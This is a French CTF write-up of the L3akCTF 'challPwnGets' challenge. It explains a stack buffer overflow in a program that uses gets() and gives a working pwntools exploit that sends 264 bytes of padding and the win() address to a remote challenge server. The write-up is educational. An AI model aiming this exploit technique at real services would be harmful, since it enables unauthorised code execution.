# 🚩 Writeup des Challenges CTF L3ak 🚩

Date: 17 juillet 2025



## 📝 Introduction

Dans cette note, on va explorer les challenges CTF du dossier L3akCTF. J'ai analysé les exploits existants et je vais t'expliquer comment ils fonctionnent de manière simple. C'est super intéressant de comprendre ces techniques !

---

## 💣 Challenge 1: challPwnGets - Buffer Overflow Attack

![Buffer Overflow](https://i.imgur.com/JqUfzsH.png)

### 🔍 Description du challenge
Ce challenge est un programme qui utilise la fonction `gets()` en C, qui est connue pour être dangereuse car elle ne vérifie pas les limites de la mémoire.

### 🛠️ Notre objectif
On doit exploiter un "buffer overflow" pour rediriger l'exécution du programme vers une fonction spéciale appelée `win` qui nous donnera le flag.

### 📊 Analyse technique
- Le programme est un **ELF 64-bit**
- Il n'est **pas strippé** (les symboles sont présents)
- Il y a une fonction `win` à l'adresse **0x401262**
- On a besoin de **264 bytes** de padding pour atteindre l'adresse de retour

### 💻 Code d'exploitation
```python
from pwn import *

# Configuration
context.arch = 'amd64'
context.log_level = 'debug'

# Construction du payload
offset = 264
padding = b'A' * offset  # On remplit avec plein de 'A'
win = p64(0x401262)      # L'adresse de la fonction win
payload = padding + win  # Notre payload complet

# Connexion au serveur
conn = remote('34.45.81.67', 16002)

# Attendre le prompt
conn.recvuntil(b'bytes): ')

# Envoyer le payload
conn.sendline(payload)

# Passer en mode interactif pour voir le flag
conn.interactive()
```

### 🧠 Explications simples
1. On envoie 264 caractères 'A' pour remplir le buffer
2. Ensuite on ajoute l'adresse de la fonction `win`
3. Quand la fonction actuelle se termine, au lieu de retourner normalement, le programme va aller exécuter la fonction `win`
4. La fonction `win` nous donne le flag !

---

